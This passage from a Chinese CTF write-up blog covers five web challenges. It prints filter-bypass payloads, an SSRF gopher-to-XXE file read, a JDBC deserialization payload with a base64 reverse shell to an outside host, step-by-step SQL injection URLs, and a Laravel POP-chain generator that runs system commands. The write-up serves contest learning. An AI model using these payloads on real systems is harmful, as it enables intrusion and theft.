+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $object;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $variable;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $o = <span class="keyword">$this</span>-&gt;object;</span><br><span class="line">        $m = <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">        $v = <span class="keyword">$this</span>-&gt;variable;</span><br><span class="line">        $o-&gt;$m();</span><br><span class="line">        <span class="keyword">global</span> $$v;</span><br><span class="line">        $answer = file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $answer;</span><br><span class="line">        <span class="keyword">echo</span> $answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'‬'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'‬'</span>])-&gt;CaptureTheFlag();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you do not pass the misc'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>hints.php</p>
+<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">#there is an main.php</span></span><br><span class="line"><span class="meta">#“大佬，要不咱们用一个好长好长的数字的md5做通信密码吧”</span></span><br><span class="line"><span class="meta">#“那你给我算一个出来”</span></span><br><span class="line"><span class="meta">#“好的”</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#小白打开了win10的calc，开始计算8129947191207+1992100742919</span></span><br><span class="line"><span class="meta">#然后他直接用鼠标复制了结果，计算md5值</span></span><br><span class="line"><span class="meta">#“好了大佬，10122047934126的md5值”</span></span><br><span class="line"><span class="meta">#“6dc6a29df1d7d33166bba5e17e42d2ea对吧”</span></span><br><span class="line"><span class="meta">#“哈？？？不是3e3e7d453061d953bce39ed3e82fd2a1吗”</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#“咱们对一下数字？”</span></span><br><span class="line"><span class="meta">#‭10122047934126‬</span></span><br><span class="line"><span class="meta">#10122047934126</span></span><br><span class="line"><span class="meta">#“这不是一样的吗....咋就md5不一样了.......”</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#找出来到底哪里出了问题，就可以看这道web题目了</span></span><br></pre></td></tr></table></figure>
+
+<p>给这么多页面有点懵，不清楚出题人的意图。hints和mian是解题都没用到</p>
+<ol>
+<li><p>url编码绕过</p>
+<p> index.php 过滤如下</p>
+<p> <code>if(preg_match(&quot;/log|flag|hist|dict|etc|file|write/i&quot; ,$poc))</code></p>
+<p> 用URL编码把关键字编码一下就过了。。。</p>
+<p> payload</p>
+<p> <code>a=%66%69%6c%65:///var/www/html/%66%6c%61%67.php&amp;b=%66%69%6c%65:///var/www/html/%6 6%6c%61%67.php</code></p>
+<p> <img src="/2020/06/第四届届第五空间安全大赛/image-20200626110638762.png" alt="image-20200626110638762"></p>
+</li>
+<li><p>gopher</p>
+<p> SSRF 利用 gopher 模拟 POST 请求，访问 xxe.php，然后利用 xxe 来读文件</p>
+<p> index.php 用的过滤函数是 preg_match</p>
+<p> 而在 xxe.php 里用的是 replace</p>
+ <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_replace</span><span class="params">(<span class="string">"/file|flag|write|xxe|test|rot13|utf|print|quoted|read|string|ASCII|ISO|CP1256|cs_CZ|en_AU|dtd|mcrypt|zlib/i"</span>,<span class="string">''</span>,<span class="variable">$data</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<p> 那么可以直接用 双写的方式来 bypass, 类似这样：</p>
+ <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">flreadag</span>   ==&gt; preg_replace(<span class="string">"/flag/i"</span>, <span class="string">''</span>, <span class="variable">$data</span>) ==&gt; flag</span><br></pre></td></tr></table></figure>
+
+<p> 接着xxe读取文件</p>
+ <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ureadtf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xe SYSTEM "php://filter/rereadad=convert.base64-encode/resource=flreadag.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>先URL编码下，谁便POST一下获取<code>Content-Length</code></p>
+<p><img src="/2020/06/第四届届第五空间安全大赛/image-20200626120356953.png" alt="image-20200626120356953"></p>
+<p>然后将data再URL编码两次(用PHP函数)</p>
+<p><img src="/2020/06/第四届届第五空间安全大赛/image-20200626120455719.png" alt="image-20200626120455719"></p>
+<p>payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=1&amp;b=1&amp;c=gopher://127.0.0.1:80/_POST%2520/xxe.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%2520611%250D%250A%250D%250Adata%253D%25253c%25253f%252578%25256d%25256c%252520%252576%252565%252572%252573%252569%25256f%25256e%25253d%252522%252531%25252e%252530%252522%252520%252565%25256e%252563%25256f%252564%252569%25256e%252567%25253d%252522%252575%252572%252565%252561%252564%252574%252566%25252d%252538%252522%25253f%25253e%25250a%25253c%252521%252544%25254f%252543%252554%252559%252550%252545%252520%252578%252565%252520%25255b%25250a%25253c%252521%252545%25254c%252545%25254d%252545%25254e%252554%252520%25256e%252561%25256d%252565%252520%252541%25254e%252559%252520%25253e%25250a%25253c%252521%252545%25254e%252554%252549%252554%252559%252520%252578%252565%252520%252553%252559%252553%252554%252545%25254d%252520%252522%252570%252568%252570%25253a%25252f%25252f%252566%252569%25256c%252574%252565%252572%25252f%252572%252565%252572%252565%252561%252564%252561%252564%25253d%252563%25256f%25256e%252576%252565%252572%252574%25252e%252562%252561%252573%252565%252536%252534%25252d%252565%25256e%252563%25256f%252564%252565%25252f%252572%252565%252573%25256f%252575%252572%252563%252565%25253d%252566%25256c%252572%252565%252561%252564%252561%252567%25252e%252570%252568%252570%252522%252520%25253e%25255d%25253e%25250a%25253c%252572%25256f%25256f%252574%25253e%25250a%25253c%25256e%252561%25256d%252565%25253e%252526%252578%252565%25253b%25253c%25252f%25256e%252561%25256d%252565%25253e%25250a%25253c%25252f%252572%25256f%25256f%252574%25253e</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-zzm’s-blog"><a href="#3-zzm’s-blog" class="headerlink" title="3.zzm’s blog"></a>3.<strong>zzm’s blog</strong></h3><p>根据题目给的pom.xml</p>
+<p><img src="/2020/06/第四届届第五空间安全大赛/image-20200626132854601.png" alt="image-20200626132854601"></p>
+<p>和这篇<a href="https://b1ue.cn/archives/189.html#pom.xml" target="_blank" rel="noopener">文章</a>jdbc url可以指定导致rce</p>
+<p>先搭一个<a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">恶意的mysql服务器</a>和JAVA序列化的工具<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></p>
+<p><img src="/2020/06/第四届届第五空间安全大赛/image-20200626133727220.png" alt="image-20200626133727220"></p>
+<p>接着监听端口</p>
+<p><img src="/2020/06/第四届届第五空间安全大赛/image-20200626133825721.png" alt="image-20200626133825721"></p>
+<p>payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"id"</span>:[<span class="string">"com.mysql.cj.jdbc.admin.MiniAdmin"</span>, <span class="string">"jdbc:mysql://ip:port/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections5_bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mICAgL2Rldi90Y3AvMS4xLjEuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>]&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/第四届届第五空间安全大赛/image-20200626133930336.png" alt="image-20200626133930336"></p>
+<h3 id="4-美团外卖"><a href="#4-美团外卖" class="headerlink" title="4.美团外卖"></a>4.<strong>美团外卖</strong></h3><p><a href="http://www.zip源码泄露" target="_blank" rel="noopener">www.zip源码泄露</a></p>
+<p>在daochu.php存在注入</p>
+<p>关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$type=$_GET[<span class="string">'type'</span>];</span><br><span class="line">$imei=$_GET[<span class="string">'imei'</span>];</span><br><span class="line">$imei2=$_GET[<span class="string">'imei2'</span>];</span><br><span class="line"><span class="keyword">if</span>($type==<span class="number">1</span>)&#123;</span><br><span class="line">true$biao=<span class="string">'content'</span>;</span><br><span class="line">true$result = mysqli_query($link,<span class="string">'select * from '</span>.$biao.<span class="string">' where imei="'</span>.$imei.<span class="string">'" and  imei2="'</span>.$imei2.<span class="string">'"'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span><span class="symbol">%23</span> //字段数为<span class="number">6</span></span><br></pre></td></tr></table></figure>
+
+<p>回显4，6，2, 3</p>
+<p><img src="/2020/06/第四届届第五空间安全大赛/image-20200627101937077.png" alt="image-20200627101937077"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(schema_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.schemata<span class="symbol">%23</span>  //数据库名</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/第四届届第五空间安全大赛/image-20200627102635262.png" alt="image-20200627102635262"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(table_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema='cms'<span class="symbol">%23</span>   //表</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/第四届届第五空间安全大赛/image-20200627102842991.png" alt="image-20200627102842991"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php？<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(column_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.columns<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema<span class="symbol">%3</span>d'cms'<span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>table_name<span class="symbol">%3</span>d'hint'<span class="symbol">%23</span> //字段</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/第四届届第五空间安全大赛/image-20200627104512801.png" alt="image-20200627104512801"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(hints)<span class="symbol">%20</span>from<span class="symbol">%20</span>hint<span class="symbol">%23</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/第四届届第五空间安全大赛/image-20200627104803417.png" alt="image-20200627104803417"></p>
+<p>开始不能访问的<code>/lib/webuploader/0.1.5/server/preview.php</code>加上这个目录就行了，POST数据就行</p>
+<p><img src="/2020/06/第四届届第五空间安全大赛/image-20200627105703977.png" alt="image-20200627105703977"></p>
+<p><img src="/2020/06/第四届届第五空间安全大赛/image-20200627105855419.png" alt="image-20200627105855419"></p>
+<h3 id="5-laravel"><a href="#5-laravel" class="headerlink" title="5.laravel"></a>5.<strong>laravel</strong></h3><p><code>./artisan -v</code>  得到版本 <code>Laravel Framework 5.7.28</code></p>
+<p>5.7.X版本存在一个反序列化漏洞,根据<a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank" rel="noopener">文章</a>查看源码发现 <code>vendor\laravel\framework\src\Illuminate\Foundation\Testing\PendingCommand.php</code>的 <code>run</code>方法被删除了，只能找其他链子</p>
+<p>根据文件对比工具</p>
+<p><code>app\Http\Controllers\TaskController.php</code>有个反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">true <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">truetrue unserialize($_GET[<span class="string">'p'</span>]);</span><br><span class="line">true &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">"There is an param names p (get)"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>routes\web.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">Route::get(<span class="string">'/index'</span>, <span class="string">'TaskController@index'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>POP</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> $route;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = <span class="string">"cat /flag"</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"> <span class="title">class</span> <span class="title">Generator</span> &#123;</span><br><span class="line"> <span class="title">protected</span> $<span class="title">formatters</span> = <span class="title">array</span>();</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($formatters)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;formatters = $formatters;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"> $<span class="title">a</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">Generator</span>(<span class="title">array</span>("<span class="title">addCollection</span>" =&gt; "<span class="title">system</span>"));</span><br><span class="line"> $b = <span class="keyword">new</span></span><br><span class="line">Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($a);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="\2019\11\2019湖湘杯web复现\" rel="bookmark">湖湘杯2019复现</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="\2020\03\51ELAB易霖博YCTF-WP\" rel="bookmark">51ELAB易霖博YCTF</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="\2020\03\2020北邮校赛\" rel="bookmark">2020北邮校赛</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="\2020\05\GKCTF2020-WP\" rel="bookmark">GKCTF2020-WP</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="\2019\10\第十届极客大挑战Write-up\" rel="bookmark">第十届极客大挑战Write-up</a></div>
+      
+    </li>
+  
+  </ul>
+
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>0xCreed</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/" title="第四届届第五空间安全大赛">https://0xcreed.jxustctf.top/2020/06/第四届届第五空间安全大赛/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+		<div>
+		
+			
+				<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+			
+			
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/WEB/" rel="tag"> <i class="fa fa-tag"></i> WEB</a>
+			   
+            
+              <a href="/tags/WP/" rel="tag"> <i class="fa fa-tag"></i> WP</a>
+			   
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/06/记一次学校的内网漫游/" rel="next" title="记一次学校的内网漫游">
+                  <i class="fa fa-chevron-left"></i> 记一次学校的内网漫游
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="comments"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+	
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+	
+	  </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-hate-php"><span class="nav-number">1.1.</span> <span class="nav-text">1.hate-php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-do-you-know"><span class="nav-number">1.2.</span> <span class="nav-text">2.do you know</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-zzm’s-blog"><span class="nav-number">1.3.</span> <span class="nav-text">3.zzm’s blog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-美团外卖"><span class="nav-number">1.4.</span> <span class="nav-text">4.美团外卖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-laravel"><span class="nav-number">1.5.</span> <span class="nav-text">5.laravel</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/1.gif"
+      alt="0xCreed">
+  <p class="site-author-name" itemprop="name">0xCreed</p>
+  <div class="site-description" itemprop="description">Winter is coming</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/0xCreed" title="GitHub &rarr; https://github.com/0xCreed" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      推荐阅读
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/mwq1024/" title="https://www.cnblogs.com/mwq1024/" rel="noopener" target="_blank">旧博客</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.leavesongs.com/" title="https://www.leavesongs.com/" rel="noopener" target="_blank">PH牛</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://li1m.github.io/" title="https://li1m.github.io/" rel="noopener" target="_blank">LiM</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+	  
+	  
+	
+
+    </div>
+  </aside>
+
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+      <style>
+    #aplayer {
+        width: 50%;
+        margin: 0 auto;
+    }
+    @media screen and (max-device-width: 400px) {
+        #aplayer {
+            width: 100%;
+        }
+    }
+      </style>
+      <link rel="stylesheet" href="/dist/APlayer.min.css">
+      <div id="aplayer"></div>
+      <script type="text/javascript" src="/dist/APlayer.min.js"></script>
+      <script type="text/javascript" src="/dist/music.js"></script>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0xCreed</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">145k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">2:12</span>
